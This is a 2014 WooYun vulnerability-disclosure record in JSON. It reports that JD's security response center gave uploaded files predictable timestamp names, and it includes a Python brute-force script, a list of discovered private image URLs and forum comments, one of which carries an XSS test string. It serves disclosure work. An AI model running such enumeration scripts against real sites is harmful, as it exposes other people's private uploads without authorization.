{"id": 4896, "wybug_id": "wooyun-2014-052133", "wybug_title": "京东JSRC各种漏洞泄漏", "wybug_corp": "京东商城", "wybug_author": "bing", "wybug_date": "2014-02-27 10:22", "wybug_open_date": "2014-04-13 10:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向公众公开  简要描述： 好久没在wooyun刷漏洞了，嘻唰唰洗刷刷嘻唰唰洗刷刷 详细说明：  提交漏洞上传图片证明时，通过上传抓包获得图片地址\nhttp://security.jd.com///Public//userfile//201402//27100414_.jpg\n\n\n对URL分析发现重命名有规律可循201402\t//2014年02月27100414\t//27日10点04分14秒根据这个规则利用下面的python代码探测图片地址\n__author__ = 'bingsec'import datetime,timeimport httplib,urllib2import socketdef daterange(start_date, end_date):        for n in range(int ((end_date - start_date).days)):            yield start_date + datetime.timedelta(n)def get_status_code(host, path=\"\"):    \"\"\" This function retreives the status code of a website by requesting        HEAD data from the host. This means that it only requests the headers.        If the host cannot be reached or something else goes wrong, it returns        None instead.    \"\"\"    try:        conn = httplib.HTTPConnection(host)        conn.request(\"HEAD\", path)        return conn.getresponse().status    except StandardError:        return Nonedef GetResponse(url):    try:        code = get_status_code(taget_url, url)        if code == 200:            print \"success:\" + taget_url + url            WritePath(taget_url + url, \"jd.txt\")        else:            print 'error: ' + taget_url + url    except: passdef WritePath(content, filename):    writefile = file(filename, \"a+\")    writefile.write(content + \"\\r\\n\")    writefile.close()start_date = datetime.datetime(2013, 11, 1)end_date = datetime.datetime(2014, 1, 31)taget_url = 'security.jd.com'for single_date in daterange(start_date, end_date):    for hour in range(12, 24 + 1):        for m in range(2, 60):            for s in range(10, 60):                str = '/Public/userfile/'+ time.strftime('%Y%m/%d' + '%02d%02d%02d'%(hour, m, s) + '_.jpg', single_date.timetuple())                GetResponse(str)\n   漏洞证明：  成功探测出的漏洞图片地址\nsecurity.jd.com/Public/userfile/201311/02212940_.jpg security.jd.com/Public/userfile/201311/03180552_.jpg security.jd.com/Public/userfile/201311/03180558_.jpg security.jd.com/Public/userfile/201311/03182134_.jpg security.jd.com/Public/userfile/201311/04122622_.jpg security.jd.com/Public/userfile/201311/04123621_.jpg security.jd.com/Public/userfile/201311/04123638_.jpg security.jd.com/Public/userfile/201311/04123645_.jpg security.jd.com/Public/userfile/201311/04123646_.jpg security.jd.com/Public/userfile/201311/04123647_.jpg security.jd.com/Public/userfile/201311/04123648_.jpg security.jd.com/Public/userfile/201311/04123651_.jpg security.jd.com/Public/userfile/201311/04123652_.jpg security.jd.com/Public/userfile/201311/04123653_.jpg security.jd.com/Public/userfile/201311/04123654_.jpg security.jd.com/Public/userfile/201311/04123655_.jpg security.jd.com/Public/userfile/201311/04123656_.jpg security.jd.com/Public/userfile/201311/04123736_.jpg security.jd.com/Public/userfile/201311/04123757_.jpg security.jd.com/Public/userfile/201311/04123859_.jpg security.jd.com/Public/userfile/201311/04124747_.jpg security.jd.com/Public/userfile/201311/04133119_.jpg security.jd.com/Public/userfile/201311/04142047_.jpg security.jd.com/Public/userfile/201311/04143954_.jpg security.jd.com/Public/userfile/201311/04145024_.jpg security.jd.com/Public/userfile/201311/04152835_.jpg security.jd.com/Public/userfile/201311/04153038_.jpg security.jd.com/Public/userfile/201311/04170626_.jpg security.jd.com/Public/userfile/201311/04170713_.jpg security.jd.com/Public/userfile/201311/08132833_.jpg security.jd.com/Public/userfile/201311/08141610_.jpg security.jd.com/Public/userfile/201311/08141832_.jpg security.jd.com/Public/userfile/201311/08143320_.jpg security.jd.com/Public/userfile/201311/08143427_.jpg security.jd.com/Public/userfile/201311/19121112_.jpg security.jd.com/Public/userfile/201311/19180857_.jpg security.jd.com/Public/userfile/201311/21150513_.jpg security.jd.com/Public/userfile/201311/21150723_.jpg security.jd.com/Public/userfile/201311/22142454_.jpg security.jd.com/Public/userfile/201311/22145019_.jpg security.jd.com/Public/userfile/201311/24171532_.jpg security.jd.com/Public/userfile/201312/17190859_.jpg security.jd.com/Public/userfile/201401/17161531_.jpg security.jd.com/Public/userfile/201401/17162117_.jpg security.jd.com/Public/userfile/201401/17162647_.jpg\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 bing@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-03-04 09:16 厂商回复： 非常感谢您对京东的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-27 10:24 |    \t\tTestRoot \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:19        | sys)\t\t \n  http://t.qq.com/p/t/388763094595368     \n     2014-02-27 10:25 |    \t\tTestRoot \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:19        | sys)\t\t \n  @TestRoot 快来围观咯    \n     2014-02-27 10:25 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  http://t.qq.com/p/t/388763094595368    \n     2014-02-27 10:26 |    \t\tPang \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        | 若你选择梦中，就把尘世的性命送给我做报酬...)\t\t \n  http://t.qq.com/p/t/388763094595368    \n     2014-02-27 10:30 |    \t\topen \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:5        | ;alert('robert');//)\t\t \n  小伙子，图样图神魄    \n     2014-02-27 10:39 |    \t\t大隐 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:4        | 我是一只小菜鸟、、、、)\t\t \n  http://t.qq.com/p/t/388763094595368  京东真心小气啊，真心不嫌丢人，我只能说呵呵了，，，大伙快来围观，    \n     2014-02-27 10:44 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  是不是应该@cnbird    \n     2014-02-27 10:57 |    \t\t‫‌ \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:14        )\t\t \n  除了呵呵，我还能多说什么？小心报案，谨防钓鱼。    \n     2014-02-27 11:02 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  哈哈T。    \n     2014-02-27 12:22 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  除了呵呵，我还能多说什么？小心报案，谨防钓鱼。    \n     2014-02-27 17:11 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  除了呵呵，我还能多说什么？小心报案，谨防钓鱼。    \n     2014-02-27 19:33 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  很久以前，有个白帽子发京东的洞，然后就没有然后了    \n     2014-02-28 00:43 |    \t\t法海 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | 许仙去哪了)\t\t \n  很久以前，有个白帽子发京东的洞，还主动去京东要礼物，然后就没有然后了    \n     2014-02-28 09:53 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  除了呵呵，我还能多说什么？小心报案，谨防钓鱼。    \n     2014-02-28 09:56 |    \t\t残雪 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:7        | 屌丝一枚擅长扯淡)\t\t \n  这是要五杀的节奏啊    \n     2014-02-28 12:05 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  呵呵    \n     2014-03-24 11:44 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  才给5啊？    \n     2014-05-05 09:37 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  代码真优美啊    \n     2014-10-10 10:17 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @wefgod 现在还能看    \n     2014-10-17 15:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @px1624 哈哈，真的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}